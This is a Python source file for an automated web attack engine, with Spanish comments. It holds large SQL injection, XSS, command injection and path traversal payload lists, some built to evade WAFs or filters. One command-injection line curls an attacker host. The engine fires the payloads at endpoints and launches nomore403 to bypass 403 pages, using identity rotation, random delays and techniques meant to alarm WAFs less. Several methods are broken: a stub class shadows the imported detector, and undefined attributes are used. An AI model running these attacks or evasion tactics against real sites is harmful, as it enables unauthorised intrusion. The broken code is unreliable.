import asyncio
from typing import List, Dict, Any
import json
import random
from console_manager import ConsoleManager
from smart_detector import SmartDetector
import threading
import subprocess
import os
import sys
from datetime import datetime
import shutil

class SmartDetector:
    def __init__(self, console_manager: ConsoleManager): # Add console_manager
        self.console = console_manager
        self.console.print_debug("Smart Detector Initialized")

class AttackEngine:
    def __init__(self, console_manager: ConsoleManager, interactsh_url: str = None): # Add interactsh_url
        self.console = console_manager
        self.detector = SmartDetector(console_manager=console_manager) # Pass console_manager
        self.console.print_debug("Attack Engine Initialized")
        self.interactsh_url = interactsh_url # Store interactsh_url
        # Validation happens inside AttackEngine, just log what was provided
        if interactsh_url:
            self.console.print_info(f"Interactsh URL provided: {interactsh_url}")
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "'\"><script>alert(1)</script>"
            ],
            "command_injection": [
                "| dir",
                "| ls",
                "| cat /etc/passwd",
                "`whoami`",
                "$(cat /etc/passwd)",
                "& dir",
                "; ls"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
                "....//....//....//etc/passwd"
            ]
        }
        self.lock = threading.Lock()
        self.bypass_results = {}
        
        # Configuración para herramientas externas
        self.tools_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "Tools")
        
        # Asegurar que existe el directorio de herramientas
        if not os.path.exists(self.tools_dir):
            os.makedirs(self.tools_dir)

        self.sql_payloads = {
            "basic": [
                "' OR '1'='1--",
                "'/**/OR/**/1=1--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--"
            ],
            "blind_time": [
                "' OR SLEEP(5)--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "1' WAITFOR DELAY '0:0:5'--",
                "' OR BENCHMARK(5000000,MD5(1))--"
            ],
            "blind_boolean": [
                "1' AND SUBSTRING((SELECT database()),1,1)='m'--",
                "1' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--"
            ],
            "error_based": [
                "1' AND 1=CAST('x' AS INTEGER)--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(61),version(),CHAR(61))x FROM information_schema.tables GROUP BY x)--"
            ],
            "waf_evasion": [
                "'%20oR%20TRUE%20--",
                "') OR ('x'='x",
                "'||CHR(39)||CHR(79)||CHR(82)||CHR(39)||CHR(49)||CHR(61)||CHR(49)--",
                "/**/UnIoN/**/SeLeCt/**/"
            ],
            "db_specific": {
                "mysql": [
                    "' AND (SELECT 6 FROM(SELECT COUNT(*),CONCAT(0x7176767176,(SELECT MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,50)),0x7176767176,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
                    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--"
                ],
                "postgresql": [
                    "' AND 1=cast(version() as integer)--",
                    "' AND 1 = ANY(SELECT 1 FROM pg_sleep(5))--"
                ],
                "mssql": [
                    "'; WAITFOR DELAY '0:0:5'--",
                    "'; EXEC xp_cmdshell 'dir'--"
                ],
                "oracle": [
                    "' || dbms_pipe.receive_message(('a'),5)--",
                    "' AND 1=UTL_INADDR.get_host_address('10.0.0.1')--"
                ]
            }
        }

        self.xss_payloads = {
            "basic": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)"
            ],
            "filter_evasion": [
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "<img src=x oNeRrOr=alert(1)>",
                "data:text/html,<script>alert(1)</script>",
                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
            ],
            "scriptless": [
                "<input onfocus=alert(1) autofocus>",
                "<body onload=alert(1)>",
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "onerror=alert(1) src=x <img>"
            ],
            "framework_specific": {
                "angular": [
                    "{{constructor.constructor('alert(1)')()}}",
                    "{{_''.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}"
                ],
                "react": [
                    "dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}",
                    "<div>{{''.constructor.constructor('alert(1)')()}}</div>"
                ],
                "vue": [
                    "v-html=\"'<img src=x onerror=alert(1)>'\"",
                    ":href=\"javascript:alert(1)\""
                ]
            },
            "dom_based": [
                "javascript:window['al'+'ert'](1)",
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "window[String.fromCharCode(97,108,101,114,116)](1)"
            ],
            "advanced_obfuscation": [
                "<svg onload=eval('al'+'ert(1)')>",
                "<img src=x onerror=Function('ale'+'rt(1)')()>",
                ''.join(chr(c) for c in [60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]),
                "eval(\\u0061lert(1))"
            ]
        }

        self.command_injection_payloads = {
            "basic": [
                ";whoami",
                "&dir",
                "|cat /etc/passwd",
                "$(id)"
            ],
            "alternative_separators": [
                "&&whoami",
                "||id",
                ";sleep 5",
                "&timeout 5"
            ],
            "obfuscated": [
                ";`w``h``o``a``m``i`",
                "$(sleep${IFS}5)",
                ";ECHO is on.|whoami",
                ";uname${IFS}-a"
            ],
            "advanced": [
                ";curl${IFS}http://attacker.com",
                "&tasklist",
                ";ping${IFS}-c${IFS}5${IFS}127.0.0.1",
                "|net users" 
            ],
            "blind": [
                "`sleep 10`",
                "$(ping -c 10 127.0.0.1)",
                "& timeout /t 10",
                "| waitfor /t 10 someprocess"
            ]
        }

        self.path_traversal_payloads = {
            "basic": [
                "../etc/passwd",
                "..\\windows\\system32\\cmd.exe",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            "encoded": [
                "%2e%2e%2fetc%2fpasswd",
                "%252e%252e%252fetc%252fpasswd",
                "..%5cwindows%5csystem32",
                "%c0%ae%c0%ae%c0%af"
            ],
            "filter_evasion": [
                "....//....//etc/passwd",
                ".././.././etc/passwd",
                "..%c0%afetc%c0%afpasswd",
                "../../../../../../../../../../etc/passwd%00"
            ],
            "advanced": [
                "....//....//....//....//etc//passwd",
                "../////etc/////passwd",
                "..\\..\\..\\..\\windows\\system32",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/proc/self/mountinfo"
            ]
        }

        self.error_detection_payloads = {
            "basic": [
                "param=invalid'value",
                "id=-1 OR 1=1",
                "../../../../../../../../etc/passwd",
                "<invalid>",
                "1/0"
            ],
            "debug": [
                "debug=true",
                "test=1",
                "show_errors=1",
                "display_errors=1"
            ],
            "version": [
                "version()",
                "@@version",
                "SELECT VERSION()",
                "SHOW VARIABLES"
            ]
        }

    def get_tool_path(self, tool_name: str) -> str:
        """
        Busca la ruta de una herramienta, primero globalmente y luego en Tools/
        
        Args:
            tool_name: Nombre de la herramienta
            
        Returns:
            Ruta completa a la herramienta
        """
        # Primero intentar encontrar la herramienta globalmente
        global_path = shutil.which(tool_name)
        if global_path:
            print(f"Usando {tool_name} global: {global_path}")
            return global_path
            
        # Si no está disponible globalmente, buscar en Tools/
        local_path = os.path.join(self.tools_dir, tool_name)
        if os.path.isfile(local_path) and os.access(local_path, os.X_OK):
            print(f"Usando {tool_name} local: {local_path}")
            return local_path
            
        # Si tool_name tiene ./ al principio, buscar en la ruta absoluta
        if tool_name.startswith("./"):
            direct_path = os.path.abspath(tool_name)
            if os.path.isfile(direct_path) and os.access(direct_path, os.X_OK):
                print(f"Usando {tool_name} desde ruta directa: {direct_path}")
                return direct_path
                
        # Si no existe, mostrar error y buscar alternativas para instalar
        print(f"ERROR: No se encontró {tool_name}. Verificando posibilidad de instalación...")
        
        # Comprobar si podemos instalarlo en Tools/
        if tool_name == "nomore403":
            print("nomore403 no está instalado. Debe instalarse manualmente:")
            print("  cd Tools")
            print("  git clone https://github.com/devploit/nomore403")
            print("  cd nomore403")
            print("  go build")
            return None
            
        return None

    async def handle_forbidden(self, url: str, threads: int = 5) -> Dict[str, Any]:
        """
        Maneja un código 403 iniciando un ataque con nomore403 en un hilo separado.
        
        Args:
            url: URL que devolvió el código 403
            threads: Número de hilos a utilizar para el ataque
            
        Returns:
            Diccionario con los resultados del ataque
        """
        result = {"status": "initiated", "url": url, "findings": []}
        
        # Buscar la ruta de nomore403
        nomore403_path = self.get_tool_path("nomore403")
        if not nomore403_path:
            # Intentar con ./nomore403 (usado en algunas configuraciones)
            nomore403_path = self.get_tool_path("./nomore403")
            
        if not nomore403_path:
            # Intentar buscar en Tools/nomore403/nomore403
            deep_path = os.path.join(self.tools_dir, "nomore403", "nomore403")
            if os.path.isfile(deep_path) and os.access(deep_path, os.X_OK):
                nomore403_path = deep_path
                
        if not nomore403_path:
            result["status"] = "error"
            result["error"] = "No se encontró la herramienta nomore403. Instálala en Tools/nomore403/"
            return result
        
        def run_nomore403():
            try:
                # Construir el comando para nomore403
                cmd = [
                    nomore403_path,
                    "-u", url,
                    "-m", str(threads),
                    "--random-agent",
                    "-v",
                    "-r",  # Seguir redirecciones
                    "-k", "headers,path-case,endpaths",  # Técnicas que pueden alarmar menos al WAF
                    "--timeout", "10000",
                    "--unique"
                ]
                
                print(f"Ejecutando comando: {' '.join(cmd)}")
                
                # Ejecutar el comando y capturar la salida
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                stdout, stderr = process.communicate()
                
                with self.lock:
                    # Procesar resultados
                    if process.returncode == 0:
                        result["status"] = "success"
                        result["output"] = stdout
                        
                        # Analizar la salida para extraer hallazgos
                        for line in stdout.splitlines():
                            if "Bypass successful" in line or "Status: 200" in line:
                                finding = {
                                    "type": "bypass_403",
                                    "details": line,
                                    "timestamp": datetime.now().isoformat()
                                }
                                result["findings"].append(finding)
                                self.bypass_results[url] = finding
                    else:
                        result["status"] = "failed"
                        result["error"] = stderr
                        result["returncode"] = process.returncode
            
            except Exception as e:
                with self.lock:
                    result["status"] = "error"
                    result["error"] = str(e)
        
        # Iniciar el proceso en un hilo separado
        thread = threading.Thread(target=run_nomore403)
        thread.daemon = True  # El hilo se cerrará cuando el programa principal termine
        thread.start()
        
        return result
    
    async def run_attacks(self, page, endpoints: List[str]) -> List[Dict]:
        findings = []
        
        # 1. Modificar variables dinámicas
        await self._modify_dynamic_variables(page)
        
        # 2. Probar endpoints con diferentes payloads
        for endpoint in endpoints:
            # Probar diferentes métodos HTTP
            for method in ["GET", "POST", "PUT", "DELETE"]:
                findings.extend(await self._test_endpoint(page, endpoint, method))
        
        # 3. Buscar errores útiles
        findings.extend(await self._search_error_messages(page))
        
        # 4. Probar bypassear códigos 403 encontrados
        for endpoint in endpoints:
            try:
                response = await page.goto(endpoint, wait_until="domcontentloaded")
                if response and response.status == 403:
                    print(f"Detectado código 403 en {endpoint}, intentando bypass...")
                    bypass_result = await self.handle_forbidden(endpoint)
                    findings.append({
                        "type": "forbidden_bypass_attempt",
                        "endpoint": endpoint,
                        "status": bypass_result["status"]
                    })
            except Exception as e:
                print(f"Error al verificar endpoint {endpoint}: {str(e)}")
        
        return findings

    async def _modify_dynamic_variables(self, page) -> None:
        # Modificar variables globales
        await page.evaluate("""
            () => {
                const globals = Object.keys(window);
                for (const key of globals) {
                    if (typeof window[key] === 'function') {
                        window[key] = function() {
                            console.log(`[Hooked] ${key} called with:`, arguments);
                            return window[key].apply(this, arguments);
                        };
                    }
                }
            }
        """)

    async def _test_endpoint(self, page, endpoint: str, method: str) -> List[Dict]:
        findings = []
        
        for attack_type, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    # Construir URL con payload
                    if method == "GET":
                        url = f"{endpoint}?param={payload}"
                    else:
                        url = endpoint
                    
                    # Configurar la petición
                    request_options = {
                        "method": method,
                        "headers": {
                            "Content-Type": "application/json",
                            "X-Test": "true"
                        }
                    }
                    
                    if method != "GET":
                        request_options["body"] = json.dumps({"param": payload})
                    
                    # Enviar petición
                    response = await page.evaluate(f"""
                        async () => {{
                            try {{
                                const response = await fetch("{url}", {json.dumps(request_options)});
                                const text = await response.text();
                                return {{
                                    status: response.status,
                                    text: text,
                                    headers: Object.fromEntries(response.headers.entries())
                                }};
                            }} catch (error) {{
                                return {{ error: error.message }};
                            }}
                        }}
                    """)
                    
                    # Analizar respuesta
                    if "error" in response:
                        findings.append({
                            "type": f"{attack_type}_error",
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload,
                            "error": response["error"]
                        })
                    else:
                        # Buscar indicadores de vulnerabilidad
                        if self._is_vulnerable(response, attack_type):
                            findings.append({
                                "type": f"{attack_type}_vulnerability",
                                "endpoint": endpoint,
                                "method": method,
                                "payload": payload,
                                "response": response
                            })
                
                except Exception as e:
                    findings.append({
                        "type": f"{attack_type}_exception",
                        "endpoint": endpoint,
                        "method": method,
                        "payload": payload,
                        "error": str(e)
                    })
        
        return findings

    def _is_vulnerable(self, response: Dict, attack_type: str) -> bool:
        if "error" in response:
            return True
            
        text = response.get("text", "").lower()
        status = response.get("status", 0)
        
        indicators = {
            "sql_injection": [
                "sql syntax",
                "mysql error",
                "postgresql error",
                "oracle error",
                "sqlite error"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "javascript:alert(1)",
                "onerror=alert(1)"
            ],
            "command_injection": [
                "root:",
                "system32",
                "cmd.exe",
                "sh:",
                "bash:"
            ],
            "path_traversal": [
                "root:",
                "etc/passwd",
                "windows/system32",
                "access denied"
            ]
        }
        
        if attack_type in indicators:
            return any(indicator in text for indicator in indicators[attack_type])
        
        return False

    async def _search_error_messages(self, page) -> List[Dict]:
        findings = []
        
        # Buscar mensajes de error en la consola
        console_errors = await page.evaluate("""
            () => {
                const errors = [];
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === Node.TEXT_NODE) {
                                const text = node.textContent;
                                if (text.includes('error') || text.includes('exception') || text.includes('failed')) {
                                    errors.push({
                                        text: text,
                                        element: node.parentElement.tagName,
                                        path: node.parentElement.getAttribute('id') || 
                                              node.parentElement.getAttribute('class') || 
                                              'unknown'
                                    });
                                }
                            }
                        });
                    });
                });
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
                return errors;
            }
        """)
        
        for error in console_errors:
            findings.append({
                "type": "error_message",
                "message": error["text"],
                "location": f"{error['element']} ({error['path']})"
            })
        
        return findings

    async def test_sql_injection(self, url: str):
        payloads = self.detector.sql_payloads
        results = []
        
        for i, payload in enumerate(payloads):
            try:
                # Rotar identidad periódicamente
                if await self.detector.should_rotate_identity():
                    headers = await self.detector.get_next_user_agent_and_headers()
                    print(f"Rotando identidad: {headers['user-agent']}")
                
                # Añadir delay aleatorio para simular comportamiento humano
                await asyncio.sleep(random.uniform(0.5, 2.0))
                
                # Aplicar ofuscación adicional aleatoriamente
                if random.random() < 0.3:
                    payload = self.detector.obfuscate_payload(payload, random.randint(1, 3))
                
                # Ejecutar la prueba
                response = await self.page.evaluate(f"""
                    async () => {{
                        try {{
                            const response = await fetch("{url}?param={payload}", {{
                                headers: {json.dumps(headers)}
                            }});
                            return {{
                                status: response.status,
                                text: await response.text(),
                                headers: Object.fromEntries(response.headers.entries())
                            }};
                        }} catch (error) {{
                            return {{ error: error.message }};
                        }}
                    }}
                """)
                
                # Registrar resultado con información detallada de error
                log_entry = await self.detector.log_response_status(
                    response, f"SQL Injection Test #{i+1}"
                )
                results.append(log_entry)
                
            except Exception as e:
                print(f"Error en test SQL injection: {str(e)}")
        
        return results

    async def test_xss(self, page, endpoint: str) -> List[Dict]:
        findings = []
        
        for category, payloads in self.xss_payloads.items():
            if isinstance(payloads, dict):
                # Manejar payloads específicos de frameworks
                for framework, framework_payloads in payloads.items():
                    findings.extend(await self._test_framework_xss(page, endpoint, framework, framework_payloads))
            else:
                # Manejar payloads generales
                for payload in payloads:
                    try:
                        # Aplicar payload
                        escaped_payload = payload.replace('"', '\\"')
                        result = await page.evaluate(f"""
                            async () => {{
                                try {{
                                    // Insertar payload en varios contextos
                                    document.body.innerHTML += '{escaped_payload}';
                                    
                                    // Verificar si el payload se ejecutó
                                    return {{
                                        executed: window.xssDetected || false,
                                        context: document.body.innerHTML
                                    }};
                                }} catch (e) {{
                                    return {{ error: e.toString() }};
                                }}
                            }}
                        """)

                        if result.get("executed"):
                            findings.append({
                                "type": "xss_vulnerability",
                                "category": category,
                                "payload": payload,
                                "context": result.get("context", "unknown"),
                                "severity": "high"
                            })
                            
                    except Exception as e:
                        print(f"Error testing XSS payload {payload}: {str(e)}")

        return findings

    async def _test_framework_xss(self, page, endpoint: str, framework: str, payloads: List[str]) -> List[Dict]:
        findings = []
        
        # Detectar framework
        framework_detected = await page.evaluate(f"""
            () => {{
                return {{
                    angular: typeof angular !== 'undefined' || document.querySelector('[ng-app]'),
                    react: typeof React !== 'undefined',
                    vue: typeof Vue !== 'undefined'
                }}['{framework}'];
            }}
        """)

        if framework_detected:
            for payload in payloads:
                try:
                    result = await page.evaluate(f"""
                        async () => {{
                            try {{
                                const elem = document.createElement('div');
                                elem.setAttribute('id', 'xss-test');
                                elem.innerHTML = '{payload.replace("'", "\\'")}';
                                document.body.appendChild(elem);
                                
                                return {{
                                    executed: window.xssDetected || false,
                                    context: elem.innerHTML
                                }};
                            }} catch (e) {{
                                return {{ error: e.toString() }};
                            }}
                        }}
                    """)

                    if result.get("executed"):
                        findings.append({
                            "type": "framework_xss",
                            "framework": framework,
                            "payload": payload,
                            "context": result.get("context", "unknown"),
                            "severity": "critical"
                        })

                except Exception as e:
                    print(f"Error testing {framework} XSS payload {payload}: {str(e)}")

        return findings

    def get_bypass_findings(self) -> List[Dict]:
        """
        Devuelve los resultados de bypass 403 para incluir en el informe
        """
        findings = []
        for url, result in self.bypass_results.items():
            findings.append({
                "type": "forbidden_access",
                "url": url,
                "details": "Se detectó acceso prohibido. Bypass automático iniciado.",
                "bypass_status": result.get("status", "unknown"),
                "bypass_details": result.get("details", "")
            })
        return findings


